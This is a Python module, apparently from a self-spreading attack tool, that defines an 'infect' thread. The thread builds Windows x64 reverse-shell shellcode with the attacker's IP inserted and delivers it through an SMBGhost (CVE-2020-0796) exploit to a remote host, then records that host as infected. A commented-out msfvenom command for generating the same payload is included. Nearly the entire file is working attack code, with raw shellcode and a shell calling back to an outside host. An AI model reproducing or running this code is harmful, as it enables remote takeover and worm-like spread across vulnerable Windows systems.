import binascii
import threading, subprocess
import armory.SMBGhost.exploit as exploit


class infect(threading.Thread):
    
    # initialize the infect object
    def __init__(self, rhost, rport, lhost, lport, infected=False):
        self.rhost=rhost
        self.rport=rport
        self.lhost=lhost
        self.lport=lport
        self.infected = infected
        
        super().__init__()
    
    # start infect thread
    def run(self):
        self.inject()
       
    
    # generate the shellcode base on current host's ip address
    def insert_ip_shellcode(self,lhost):
        PAYLOAD =  b""
        PAYLOAD += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
        PAYLOAD += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
        PAYLOAD += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
        PAYLOAD += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
        PAYLOAD += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        PAYLOAD += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
        PAYLOAD += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        PAYLOAD += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
        PAYLOAD += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
        PAYLOAD += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        PAYLOAD += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
        PAYLOAD += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
        PAYLOAD += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        PAYLOAD += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        PAYLOAD += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        PAYLOAD += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        PAYLOAD += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
        PAYLOAD += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
        PAYLOAD += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
        PAYLOAD += b"\x49\xbc\x02\x00\x05\x39"

        #\xc0\xa8\x38\x6c
        # append local ip bytes into the shellcode
        ip_parts = [int(part) for part in lhost.split(".")]
        hex_string = "".join([format(part, "02x") for part in ip_parts])
        ip_bytes = bytes.fromhex(hex_string)
        PAYLOAD += ip_bytes

        PAYLOAD += b"\x41\x54"
        PAYLOAD += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        PAYLOAD += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
        PAYLOAD += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
        PAYLOAD += b"\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
        PAYLOAD += b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
        PAYLOAD += b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
        PAYLOAD += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
        PAYLOAD += b"\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        PAYLOAD += b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
        PAYLOAD += b"\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
        PAYLOAD += b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
        PAYLOAD += b"\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
        PAYLOAD += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
        PAYLOAD += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
        PAYLOAD += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        PAYLOAD += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
        PAYLOAD += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
        PAYLOAD += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
        PAYLOAD += b"\x89\xda\xff\xd5"
        return PAYLOAD

    # generate windows shellcode    
    def generate_windows_shellcode(self,lhost, lport=445, arch="x64"):
        print("Generating Shellcode %s with lhost %s and lport %s" % (arch, lhost, lport))
        
        #use pre generated shellcode for windows/x64/shell_reverse_tcp
        shellcode = self.insert_ip_shellcode(lhost)
        return shellcode
        
        # if (arch == "x64"):
        #     msf_payload = "windows/x64/shell_reverse_tcp"
        # else:
        #     msf_payload = "windows/shell_reverse_tcp"
        # # generate the msfvenom command
        # msf_command = 'msfvenom -p ' + msf_payload + ' '
        # msf_command += "LHOST=" + lhost + " LPORT=" + str(lport)
        # # add final part to command to narrow down the msf output
        # msf_command += " -f hex"

        # # Run the command and get output
        # print("MSF command ->", msf_command)

        # return bytes.fromhex((subprocess.check_output(msf_command, shell=True).decode('ascii')))
    
    def get_status(self):
        return self.status
    
    # exploits the target using CVE20200796 vulnerability SMBGhost
    def inject(self):
        #build the reverse shellcode payload
        shell = self.generate_windows_shellcode(self.lhost,self.lport)
        
        #exploit the target
        result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)
        if result:
            self.infected = True
            
    def get_infected_status(self):
        return self.infected
